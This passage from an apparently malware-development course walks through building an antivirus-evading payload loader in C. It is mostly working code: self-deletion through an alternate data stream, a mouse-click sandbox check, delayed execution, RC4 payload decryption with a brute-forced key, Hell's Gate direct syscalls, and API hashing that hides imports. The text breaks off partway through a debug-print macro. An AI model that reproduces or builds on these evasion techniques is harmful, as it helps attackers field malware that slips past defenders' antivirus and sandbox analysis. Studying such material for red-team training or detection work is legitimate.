<img src="81_files/av-bypass-516782392-ec8ace35-58fe-4ac6-8317-9d553123076b.png" alt="image"></p>
<h3>Anti-Analysis Features</h3>
<p>To add anti-analysis features create a new file called <code>AntiAnalysis.c</code>. This file will contain the following functionality:</p>
<ul>
<li>
<p>Self-deletion function from the <em>Anti-Debugging - Self-Deletion</em> module.</p>
</li>
<li>
<p>Mouse clicks monitoring feature from the <em>Anti-Virtual Environments - Multiple Techniques</em> module</p>
</li>
<li>
<p>A function to delay execution using <code>NtDelayExecution</code> from the <em>Anti-Virtual Environments - Multiple Delay Execution Techniques</em> module</p>
</li>
</ul>
<p><strong>AntiAnalysis.c</strong></p>
<pre><code class="language-C">#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;

#include "Structs.h"
#include "Common.h"


// Global hook handle variable
HHOOK g_hMouseHook = NULL;
// global mouse clicks counter
DWORD g_dwMouseClicks = NULL;



// The callback function that will be executed whenever the user clicked
 a mouse button
LRESULT CALLBACK HookEvent(int nCode, WPARAM wParam, LPARAM lParam) {

    if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam 
== WM_MBUTTONDOWN) {
        printf("[+] Mouse Click Recorded \n");
        g_dwMouseClicks++;
    }

    return CallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
}



BOOL MouseClicksLogger() {

    MSG 	Msg = { 0 };

    // Installing hook 
    g_hMouseHook = SetWindowsHookExW(
        WH_MOUSE_LL,
        (HOOKPROC)HookEvent,
        NULL,
        NULL
    );
    if (!g_hMouseHook) {
        printf("[!] SetWindowsHookExW Failed With Error : %d \n", 
GetLastError());
    }

    // Process unhandled events
    while (GetMessageW(&amp;Msg, NULL, NULL, NULL)) {
        DefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
    }

    return TRUE;
}


BOOL DeleteSelf() {


	WCHAR				    szPath[MAX_PATH * 2] 	    = { 0 };
	FILE_DISPOSITION_INFO	Delete 			    	    = { 0 };
	HANDLE				    hFile 			    	    = INVALID_HANDLE_VALUE;
	PFILE_RENAME_INFO		pRename 		    	    = NULL;
	const wchar_t* 			NewStream 		    	    = (const wchar_t*)NEW_STREAM;
	SIZE_T				    sRename 		    	    = sizeof(FILE_RENAME_INFO) + 
sizeof(NewStream);

	// Allocating enough buffer for the 'FILE_RENAME_INFO' structure
	pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
	if (!pRename) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Cleaning up the structures
	ZeroMemory(szPath, sizeof(szPath));
	ZeroMemory(&amp;Delete, sizeof(FILE_DISPOSITION_INFO));

	
//--------------------------------------------------------------------------------------------------------------------------

	// Marking the file for deletion (used in the 2nd 
SetFileInformationByHandle call) 
	Delete.DeleteFile = TRUE;

	// Setting the new data stream name buffer and size in the 
'FILE_RENAME_INFO' structure
	pRename-&gt;FileNameLength = sizeof(NewStream);
	RtlCopyMemory(pRename-&gt;FileName, NewStream, sizeof(NewStream));

	
//--------------------------------------------------------------------------------------------------------------------------


	// Used to get the current file name
	if (GetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
		printf("[!] GetModuleFileNameW Failed With Error : %d \n", 
GetLastError());
		return FALSE;
	}

	
//--------------------------------------------------------------------------------------------------------------------------

	// RENAMING

	// Opening a handle to the current file
	hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, 
NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [R] Failed With Error : %d \n", 
GetLastError());
		return FALSE;
	}

	wprintf(L"[i] Renaming :$DATA to %s  ...", NEW_STREAM);

	// Renaming the data stream
	if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRename, 
sRename)) {
		printf("[!] SetFileInformationByHandle [R] Failed With Error : %d \n",
 GetLastError());
		return FALSE;
	}
	wprintf(L"[+] DONE \n");

	CloseHandle(hFile);

	
//--------------------------------------------------------------------------------------------------------------------------

	// DELEING

	// Opening a new handle to the current file
	hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, 
NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE &amp;&amp; GetLastError() == 
ERROR_FILE_NOT_FOUND) {
		// in case the file is already deleted
		return TRUE;
	}
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [D] Failed With Error : %d \n", 
GetLastError());
		return FALSE;
	}

	wprintf(L"[i] DELETING ...");

	// Marking for deletion after the file's handle is closed
	if (!SetFileInformationByHandle(hFile, FileDispositionInfo, 
&amp;Delete, sizeof(Delete))) {
		printf("[!] SetFileInformationByHandle [D] Failed With Error : %d \n",
 GetLastError());
		return FALSE;
	}
	wprintf(L"[+] DONE \n");

	CloseHandle(hFile);

	
//--------------------------------------------------------------------------------------------------------------------------


	// Freeing the allocated buffer
	HeapFree(GetProcessHeap(), 0, pRename);

	return TRUE;
}



typedef NTSTATUS(NTAPI* fnNtDelayExecution)(
	BOOLEAN              Alertable,
	PLARGE_INTEGER       DelayInterval
	);

BOOL DelayExecutionVia_NtDE(FLOAT ftMinutes) {

	// Converting minutes to milliseconds
	DWORD                   dwMilliSeconds         = ftMinutes * 60000;
	LARGE_INTEGER           DelayInterval          = { 0 };
	LONGLONG                Delay                  = NULL;
	NTSTATUS                STATUS                 = NULL;
	fnNtDelayExecution      pNtDelayExecution      = 
(fnNtDelayExecution)GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), 
"NtDelayExecution");
	DWORD                   _T0                    = NULL,
	                        _T1                    = NULL;

	printf("[i] Delaying Execution Using \"NtDelayExecution\" For %0.3d 
Seconds", (dwMilliSeconds / 1000));

	// Converting from milliseconds to the 100-nanosecond - negative time 
interval
	Delay = dwMilliSeconds * 10000;
	DelayInterval.QuadPart = -Delay;

	_T0 = GetTickCount64();

	// Sleeping for 'dwMilliSeconds' ms 
	if ((STATUS = pNtDelayExecution(FALSE, &amp;DelayInterval)) != 0x00 
&amp;&amp; STATUS != STATUS_TIMEOUT) {
		printf("[!] NtDelayExecution Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	_T1 = GetTickCount64();

	// Slept for at least 'dwMilliSeconds' ms, then 
'DelayExecutionVia_NtDE' succeeded, otherwize it failed
	if ((DWORD)(_T1 - _T0) &lt; dwMilliSeconds)
		return FALSE;

	printf("\n\t&gt;&gt; _T1 - _T0 = %d \n", (DWORD)(_T1 - _T0));

	printf("[+] DONE \n");

	return TRUE;
}
</code></pre>
<h4>AntiAnalysis Helper Function</h4>
<p>Create a new function, <code>AntiAnalysis</code>, to efficiently call the above functions. To use the <code>AntiAnalysis</code> function, an external variable, <code>g_Sys</code>, is required. <code>g_Sys</code> is a <code>VX_TABLE</code> structure that contains the data necessary to use syscalls in the program.</p>
<p>Brief points about the <code>AntiAnalysis</code> function:</p>
<ul>
<li>
<p>It takes <code>dwMilliSeconds</code> as an input parameter which represents the amount of time to monitor for mouse clicks.</p>
</li>
<li>
<p>This function begins by calling <code>DeleteSelf</code> to delete the file from the disk.</p>
</li>
<li>
<p>A while loop is then initiated, which runs the <code>MouseClicksLogger</code> through a new thread and waits for it for a period specified by <code>dwMilliSeconds</code>.</p>
</li>
<li>
<p>Once the thread time is up, the hooks installed will be removed and 
the execution of the program will be delayed for half the value of the <code>i</code> variable; where <code>i</code> represent the value to delay execution for in minutes.</p>
</li>
<li>
<p>The function then checks the total number of mouse clicks before the 
delay. If it is less than 5, the global mouse click monitor variable, <code>g_dwMouseClicks</code>, is reset so the next loop will start the mouse click test from the beginning.</p>
</li>
<li>
<p>Incrementing the variable <code>i</code> forces the subsequent <code>DelayExecutionVia_NtDE</code> function to wait for a longer duration, creating a way of delaying execution in a sandbox.</p>
</li>
</ul>
<p><strong>AntiAnalysis.c</strong></p>
<pre><code class="language-C">// using the 'extern' keyword, because 
this variable is already defined in the 'Inject.c' file
extern VX_TABLE g_Sys;

//...

BOOL AntiAnalysis(DWORD dwMilliSeconds) {

	HANDLE					hThread			= NULL;
	NTSTATUS				STATUS			= NULL;
	LARGE_INTEGER			DelayInterval	= { 0 };
	FLOAT					i			    = 1;
	LONGLONG				Delay			= NULL;

	Delay = dwMilliSeconds * 10000;
	DelayInterval.QuadPart = -Delay;

	// Self-deletion 
	if (!DeleteSelf()) {
		// we dont care for the result - but you can change this if you want
	}

	// Try 10 times, after that return FALSE
	while (i &lt;= 10) {


		printf("[#] Monitoring Mouse-Clicks For %d Seconds - Need 6 Clicks To 
Pass\n", (dwMilliSeconds / 1000));

		// Creating a thread that runs 'MouseClicksLogger' function
		HellsGate(g_Sys.NtCreateThreadEx.wSystemCall);
		if ((STATUS = HellDescent(&amp;hThread, THREAD_ALL_ACCESS, NULL, 
(HANDLE)-1, MouseClicksLogger, NULL, NULL, NULL, NULL, NULL, NULL)) != 
0) {
			printf("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", 
STATUS);
			return FALSE;
		}

		// Waiting for the thread for 'dwMilliSeconds'
		HellsGate(g_Sys.NtWaitForSingleObject.wSystemCall);
		if ((STATUS = HellDescent(hThread, FALSE, &amp;DelayInterval)) != 0 
&amp;&amp; STATUS != STATUS_TIMEOUT) {
			printf("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", 
STATUS);
			return FALSE;
		}

		HellsGate(g_Sys.NtClose.wSystemCall);
		if ((STATUS = HellDescent(hThread)) != 0) {
			printf("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
			return FALSE;
		}

		// Unhooking 
		if (g_hMouseHook &amp;&amp; !UnhookWindowsHookEx(g_hMouseHook)) {
			printf("[!] UnhookWindowsHookEx Failed With Error : %d \n", 
GetLastError());
			return FALSE;
		}

		// Delaying execution for specific amount of time
		if (!DelayExecutionVia_NtDE((FLOAT)(i / 2)))
			return FALSE;

		// If the user clicked more than 5 times, we return true
		if (g_dwMouseClicks &gt; 5)
			return TRUE;

		// If not, we reset the mouse-clicks variable, and monitor the 
mouse-clicks again
		g_dwMouseClicks = NULL;

		// Increment 'i', so that next time 'DelayExecutionVia_NtDE' will wait
 longer
		i++;
	}

	return FALSE;
}
</code></pre>
<p><code>Common.h</code> must be updated to include the prototype for <code>AntiAnalysis</code> as well as defining <code>NEW_STREAM</code> which is required by the <code>DeleteSelf</code> function.</p>
<p><strong>Common.h</strong></p>
<pre><code class="language-C">// The new data stream name
#define NEW_STREAM L":Maldev"

BOOL AntiAnalysis(DWORD dwMilliSeconds);
</code></pre>
<p>The anti-analysis features can be enabled by calling the <code>AntiAnalysis</code> function in <code>main.c</code>, however, this must be done after the <code>InitializeSyscalls</code> function has been called as the <code>AntiAnalysis</code>
 function utilizes direct syscalls which are only available after this 
function has been executed. For testing, the following if-statement is 
added to the main function in <code>main.c</code>.</p>
<p><strong>Main.c</strong></p>
<pre><code class="language-C">if (!AntiAnalysis(20000)) {
	printf("[!] Detected A Virtualized Environment \n");
}
</code></pre>
<p>Where <code>20000</code> represents the time to monitor the mouse clicks in milliseconds.</p>
<h4>NtDelayExecution Via Hell's Gate</h4>
<p>Hell's Gate can be used to call <code>NtDelayExecution</code>, which requires updating the <code>VX_TABLE</code> structure definition located in <code>Common.h</code> and the <code>InitializeSyscalls</code> function to add the <code>VX_TABLE_ENTRY NtDelayExecution</code> element and initialize it. The <code>Hasher</code> program will also need to be used to calculate the hash for the syscall, as was done in previous steps.</p>
<h3>Anti-Analysis Results</h3>
<p>The following image shows the output of the <code>AntiAnalysis</code> function at runtime.</p>
<p><img src="81_files/av-bypass-616804411-39794aab-14d5-439c-9f30-2ed26efe8dce.png" alt="image"></p>
<h3>Payload Encryption</h3>
<p><code>HellShell.exe</code> will be used for payload encryption. The command that will be used is <code>.\HellShell.exe calc.bin rc4</code>, where <code>calc.bin</code> is the raw payload file. The encrypted payload will replace the previous unencrypted payload in the <code>main.c</code> file. Furthermore, the <code>Rc4EncryptionViSystemFunc032</code> function which is responsible for decryption will be saved in the <code>Inject.c</code> file.</p>
<h4>Brute Force Decryption</h4>
<p><code>HellShell.exe</code> generates the key below.</p>
<pre><code class="language-C">unsigned char Rc4Key[] = {
        0x61, 0x1A, 0xA0, 0xAA, 0xA7, 0x92, 0x9F, 0xBA, 0x8F, 0xCE, 0x4C, 0xD8, 0x11, 0xFA, 0xED, 0xB9 };
</code></pre>
<p>The key will be encrypted and then decrypted using the brute force 
method. First, the key needs to be encrypted. This will be done via a 
new project that will use the same algorithm as the <code>KeyGuard.exe</code> tool. The only difference is that the key is not randomly generated since <code>HellShell.exe</code> already generated one(<code>Rc4Key</code>). This new project is shared in this module's code and is named <code>KeyGuard2</code>.</p>
<p><img src="81_files/av-bypass-716812124-de717043-aa23-40c9-8058-f0ae0c06f407.png" alt="image"></p>
<p>The <code>Rc4EncryptionViSystemFunc032</code> function will be updated to include the brute forcing logic. The function will be called by <code>RemoteMappingInjectionViaSyscalls</code>.</p>
<pre><code class="language-C">BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

	// The return of SystemFunction032
	NTSTATUS        	STATUS				= NULL;
	BYTE			RealKey	[KEY_SIZE]	= { 0 };
	int			    b				    = 0;

	// Brute forcing the key:
	while (1) {
		// Using the hint byte, if this is equal, then we found the 'b' value needed to decrypt the key 
		if (((pRc4Key[0] ^ b) - 0) == HINT_BYTE)
			break;
		// Else, increment 'b' and try again
		else
			b++;
	}

	printf("[i] Calculated 'b' to be : 0x%0.2X \n", b);

	// Decrypting the key
	for (int i = 0; i &lt; KEY_SIZE; i++) {
		RealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);
	}

	// Making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt
	USTRING         Key = { .Buffer = RealKey,              .Length = dwRc4KeySize,         .MaximumLength = dwRc4KeySize },
			        Img = { .Buffer = pPayloadData,         .Length = sPayloadSize,         .MaximumLength = sPayloadSize };


	// Since SystemFunction032 is exported from Advapi32.dll, we load it Advapi32 into the prcess,
	// And using its return as the hModule parameter in GetProcAddress
	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

	// If SystemFunction032 calls failed it will return non zero value
	if ((STATUS = SystemFunction032(&amp;Img, &amp;Key)) != 0x0) {
		printf("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
		return FALSE;
	}

	return TRUE;
}
</code></pre>
<h3>Brute Force Decryption Results</h3>
<p>Executing the payload (Anti analysis features are disabled).</p>
<p><img src="81_files/av-bypass-816812885-3a8e28cd-22cb-42f0-9673-9d58ea2471da.png" alt="image"></p>
<h3>API Hashing</h3>
<p>So far, all the WinAPIs used have been called directly, which means 
they can be found in the IAT of the implementation. To resolve this, a 
new file, <code>ApiHashing.c</code>, is created which contains the necessary functions for implementing API hashing.</p>
<p><strong>ApiHashing.c</strong></p>
<pre><code class="language-C">#include &lt;Windows.h&gt;

#include "Structs.h"
#include "Common.h"

FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {

	if (hModule == NULL || dwApiNameHash == NULL)
		return NULL;

	PBYTE pBase = (PBYTE)hModule;

	PIMAGE_DOS_HEADER       pImgDosHdr       = (PIMAGE_DOS_HEADER)pBase;
	if (pImgDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	PIMAGE_NT_HEADERS       pImgNtHdrs       = (PIMAGE_NT_HEADERS)(pBase + 
pImgDosHdr-&gt;e_lfanew);
	if (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	IMAGE_OPTIONAL_HEADER   ImgOptHdr        = 
pImgNtHdrs-&gt;OptionalHeader;
	PIMAGE_EXPORT_DIRECTORY pImgExportDir    = 
(PIMAGE_EXPORT_DIRECTORY)(pBase + 
ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	
	PDWORD			FunctionNameArray       = (PDWORD)(pBase + 
pImgExportDir-&gt;AddressOfNames);
	PDWORD			FunctionAddressArray    = (PDWORD)(pBase + 
pImgExportDir-&gt;AddressOfFunctions);
	PWORD			FunctionOrdinalArray    = (PWORD)(pBase + 
pImgExportDir-&gt;AddressOfNameOrdinals);

	for (DWORD i = 0; i &lt; pImgExportDir-&gt;NumberOfFunctions; i++) {
		CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
		PVOID	pFunctionAddress = (PVOID)(pBase + 
FunctionAddressArray[FunctionOrdinalArray[i]]);

		// Hashing every function name `pFunctionName`
		// If both hashes are equal, then we found the function we want 
		if (dwApiNameHash == HASHA(pFunctionName)) {
			return pFunctionAddress;
		}
	}

	return NULL;
}

HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {

	if (dwModuleNameHash == NULL)
		return NULL;

#ifdef _WIN64
	PPEB			pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
	PPEB			pPeb = (PEB*)(__readfsdword(0x30));
#endif

	PPEB_LDR_DATA		    pLdr = (PPEB_LDR_DATA)(pPeb-&gt;Ldr);
	PLDR_DATA_TABLE_ENTRY	pDte = 
(PLDR_DATA_TABLE_ENTRY)(pLdr-&gt;InMemoryOrderModuleList.Flink);

	while (pDte) {

		if (pDte-&gt;FullDllName.Length != NULL &amp;&amp; 
pDte-&gt;FullDllName.Length &lt; MAX_PATH) {

			// Converting `FullDllName.Buffer` to upper case string 
			CHAR UpperCaseDllName[MAX_PATH];

			DWORD i = 0;
			while (pDte-&gt;FullDllName.Buffer[i]) {
				UpperCaseDllName[i] = (CHAR)toupper(pDte-&gt;FullDllName.Buffer[i]);
				i++;
			}
			UpperCaseDllName[i] = '\0';

			// Hashing `UpperCaseDllName` and comparing the hash value to that's 
of the input `dwModuleNameHash`
			if (HASHA(UpperCaseDllName) == dwModuleNameHash)
				return (HMODULE)(pDte-&gt;InInitializationOrderLinks.Flink);

		}
		else {
			break;
		}

		pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
	}

	return NULL;
}
</code></pre>
<h4>Header File</h4>
<p>Before continuing, a new header file, <code>typedef.h</code>, should be created to define the used WinAPIs as function pointers for clarity and maintainability. <code>Common.h</code> will need to include the <code>typedef.h</code> header file using <code>#include "typedef.h"</code>.</p>
<p><strong>typedef.h</strong></p>
<pre><code class="language-C">#pragma once

#include &lt;Windows.h&gt;


typedef ULONGLONG(WINAPI* fnGetTickCount64)();

typedef HANDLE(WINAPI* fnOpenProcess)(DWORD dwDesiredAccess, BOOL 
bInheritHandle, DWORD dwProcessId);

typedef LRESULT(WINAPI* fnCallNextHookEx)(HHOOK hhk, int nCode, WPARAM 
wParam, LPARAM lParam);

typedef HHOOK(WINAPI* fnSetWindowsHookExW)(int idHook, HOOKPROC lpfn, 
HINSTANCE hmod, DWORD dwThreadId);

typedef BOOL(WINAPI* fnGetMessageW)(LPMSG lpMsg, HWND hWnd, UINT 
wMsgFilterMin, UINT wMsgFilterMax);

typedef LRESULT(WINAPI* fnDefWindowProcW)(HWND hWnd, UINT Msg, WPARAM 
wParam, LPARAM lParam);

typedef BOOL(WINAPI* fnUnhookWindowsHookEx)(HHOOK hhk);

typedef DWORD(WINAPI* fnGetModuleFileNameW)(HMODULE hModule, LPWSTR 
lpFilename, DWORD nSize);

typedef HANDLE(WINAPI* fnCreateFileW)(LPCWSTR lpFileName, DWORD 
dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES 
lpSecurityAttributes, DWORD dwCreationDisposition, DWORD 
dwFlagsAndAttributes, HANDLE hTemplateFile);

typedef BOOL(WINAPI* fnSetFileInformationByHandle)(HANDLE hFile, 
FILE_INFO_BY_HANDLE_CLASS FileInformationClass, LPVOID 
lpFileInformation, DWORD dwBufferSize);

typedef BOOL(WINAPI* fnCloseHandle)(HANDLE hObject);
</code></pre>
<h4>API_HASHING Structure</h4>
<p>Next, a new structure <code>API_HASHING</code> is defined in <code>Common.h</code> and is used to store the addresses of WinAPIs used, making them more accessible for use within the implementation's functions.</p>
<p><strong>Common.h</strong></p>
<pre><code class="language-C">typedef struct _API_HASHING {

	fnGetTickCount64                pGetTickCount64;
	fnOpenProcess                   pOpenProcess;
	fnCallNextHookEx                pCallNextHookEx;
	fnSetWindowsHookExW             pSetWindowsHookExW;
	fnGetMessageW                   pGetMessageW;
	fnDefWindowProcW                pDefWindowProcW;
	fnUnhookWindowsHookEx           pUnhookWindowsHookEx;
	fnGetModuleFileNameW            pGetModuleFileNameW;
	fnCreateFileW                   pCreateFileW;
	fnSetFileInformationByHandle    pSetFileInformationByHandle;
	fnCloseHandle                   pCloseHandle;

}API_HASHING, * PAPI_HASHING;
</code></pre>
<h4>Updating VX_Table</h4>
<p>The <code>GetModuleHandleH</code> and <code>GetProcAddressH</code> functions must be used to initialize the elements in the <code>API_HASHING</code> structure. The <code>InitializeSyscalls</code> function then uses these functions to initialize the <code>VX_TABLE</code> structure, which is used to call syscalls.</p>
<pre><code class="language-C">// ...

API_HASHING g_Api = {0};


BOOL InitializeSyscalls() {

	// Get the PEB
	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb-&gt;ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb-&gt;OSMajorVersion != 
0xA)
		return FALSE;

	// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = 
(PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb-&gt;Ldr-
&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry-&gt;DllBase, 
&amp;pImageExportDirectory) || pImageExportDirectory == NULL)
		return FALSE;

	g_Sys.NtCreateSection.uHash          = NtCreateSection_JOAA;
	g_Sys.NtMapViewOfSection.uHash       = NtMapViewOfSection_JOAA;
	g_Sys.NtUnmapViewOfSection.uHash     = NtUnmapViewOfSection_JOAA;
	g_Sys.NtClose.uHash                  = NtClose_JOAA;
	g_Sys.NtCreateThreadEx.uHash         = NtCreateThreadEx_JOAA;
	g_Sys.NtWaitForSingleObject.uHash    = NtWaitForSingleObject_JOAA;
	g_Sys.NtQuerySystemInformation.uHash = NtQuerySystemInformation_JOAA;
	g_Sys.NtDelayExecution.uHash         = NtDelayExecution_JOAA;

	// Initialize the syscalls
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, 
&amp;g_Sys.NtCreateSection))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, 
&amp;g_Sys.NtMapViewOfSection))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, 
&amp;g_Sys.NtUnmapViewOfSection))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, 
&amp;g_Sys.NtClose))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, 
&amp;g_Sys.NtCreateThreadEx))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, 
&amp;g_Sys.NtWaitForSingleObject))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, 
&amp;g_Sys.NtQuerySystemInformation))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, 
&amp;g_Sys.NtDelayExecution))
		return FALSE;


	//	User32.dll exported
	g_Api.pCallNextHookEx      = 
(fnCallNextHookEx)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), 
CallNextHookEx_JOAA);
	g_Api.pDefWindowProcW      = 
(fnDefWindowProcW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), 
DefWindowProcW_JOAA);
	g_Api.pGetMessageW         = 
(fnGetMessageW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), 
GetMessageW_JOAA);
	g_Api.pSetWindowsHookExW   = 
(fnSetWindowsHookExW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), 
SetWindowsHookExW_JOAA);
	g_Api.pUnhookWindowsHookEx = 
(fnUnhookWindowsHookEx)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA),
 UnhookWindowsHookEx_JOAA);

	if (g_Api.pCallNextHookEx == NULL || g_Api.pDefWindowProcW == NULL || 
g_Api.pGetMessageW == NULL || g_Api.pSetWindowsHookExW == NULL || 
g_Api.pUnhookWindowsHookEx == NULL)
		return FALSE;

	// 	Kernel32.dll exported
	g_Api.pGetModuleFileNameW          = 
(fnGetModuleFileNameW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA),
 GetModuleFileNameW_JOAA);
	g_Api.pCloseHandle                 = 
(fnCloseHandle)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), 
CloseHandle_JOAA);
	g_Api.pCreateFileW                 = 
(fnCreateFileW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), 
CreateFileW_JOAA);
	g_Api.pGetTickCount64              = 
(fnGetTickCount64)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), 
GetTickCount64_JOAA);
	g_Api.pOpenProcess                 = 
(fnOpenProcess)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), 
OpenProcess_JOAA);
	g_Api.pSetFileInformationByHandle  = 
(fnSetFileInformationByHandle)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA),
 SetFileInformationByHandle_JOAA);

	if (g_Api.pGetModuleFileNameW == NULL || g_Api.pCloseHandle == NULL || 
g_Api.pCreateFileW == NULL || g_Api.pGetTickCount64 == NULL || 
g_Api.pOpenProcess == NULL || g_Api.pSetFileInformationByHandle == NULL)
		return FALSE;

	return TRUE;
}
</code></pre>
<p>The WinAPIs hashes are generated by the <code>Hasher</code> project as shown below.</p>
<p><img src="81_files/av-bypass-916815114-a9254939-9382-4dfe-8c32-54f871d9fc47.png" alt="image"></p>
<p>The next step is to utilize the <code>g_Api</code> structure to call all WinAPIs, by prefixing each one with <code>g_Api.&lt;WinAPI&gt;</code>, for example, <code>OpenProcess</code> should be called as <code>g_Api.pOpenProcess</code>.</p>
<h3>SystemFunction032 API Hashing Error</h3>
<p>While applying API hashing to the <code>SystemFunction032</code> function (that is not included in the <code>g_Api</code> structure) the following exception will occur.</p>
<p><img src="81_files/av-bypass-10.png" alt="image"></p>
<p>An exception is thrown when attempting to execute <code>SystemFunction032</code> at address <code>0x00007FFC42C09FF2</code>, which appears to be a valid address since it's being fetched using the line of code below.</p>
<pre><code class="language-C">fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddressH(LoadLibraryA("Advapi32"), SystemFunction032_JOAA);
</code></pre>
<p>Use xdbg to check the address to understand the root of the problem.</p>
<p><img src="81_files/av-bypass-11.png" alt="image"></p>
<p><img src="81_files/av-bypass-12.png" alt="image"></p>
<h4>Forwarded Functions</h4>
<p>The address being retrieved using <code>GetProcAddressH</code> does not lead to a function and instead points to the string "CRYPTSP.SystemFunction032". This indicates the presence of a <em>forwarded function</em>, where a function exported from one DLL (DLL A) is located in another DLL (DLL B). When using the original <code>GetProcAddress</code>
 WinAPI to fetch the address of this kind of function, additional logic 
is performed behind the scenes to retrieve the address in DLL B. This is
 all done seamlessly and therefore one may mistakenly assume that the 
function is exported from DLL A.</p>
<p>Therefore, instead of loading <code>Advapi32.dll</code> (DLL A) to find <code>SystemFunction032</code>, <code>Cryptsp.dll</code>
 (DLL B) should be loaded as it holds the actual address. This is 
indicated by the string "CRYPTSP.SystemFunction032", which provides a 
hint as to where the function is located. This is necessary because <code>GetProcAddressH</code> does not handle forwarded functions. By making this minor change, the code will now compile and execute successfully.</p>
<p><img src="81_files/av-bypass-13.png" alt="image"></p>
<h3>CRT Library Removal</h3>
<p>Following the steps outlined in the <em>CRT Library Removal &amp; Malware Compiling</em> module will enable the removal of the CRT Library. An error will arise because of the usage of <code>printf</code> and <code>wprintf</code>
 functions. To solve this, a custom function can be used to replace 
these functions. The printing functionality will only be enabled when 
debug mode is enabled. The <code>printf</code> and <code>wprintf</code> functions replacement should be saved in a new file called <code>Debug.h</code>, which must be included in all files that call <code>printf</code> or <code>wprintf</code>.</p>
<p><img src="81_files/av-bypass-14.png" alt="image"></p>
<p><strong>Debug.h</strong></p>
<pre><code class="language-C">#pragma once

#include &lt;Windows.h&gt;

// uncomment to enable debug mode
//\
#define DEBUG



#ifdef DEBUG

// wprintf replacement
#define PRINTW( STR, ... )                                                                  \
    if (1) {                                                                                \
        LPWSTR buf = (LPWSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );         \
        if ( buf != NULL ) {                                                                \
            int len = wsprintfW( buf, STR, __VA_ARGS__ );                                   \
            WriteConsoleW( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
            HeapFree( GetProcessHeap(), 0, buf );                                           \
        }                                                                                   \
    }  


// printf replacement
#define PRINTA( STR, ... )                                                                  \
    if (1) {                                                                                \
        LPSTR buf = (LPSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );           \
        if ( buf != NULL ) {                                                                \
            int len = wsprintfA( buf, STR, __VA_ARGS__ );                                   \
            WriteConsoleA( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
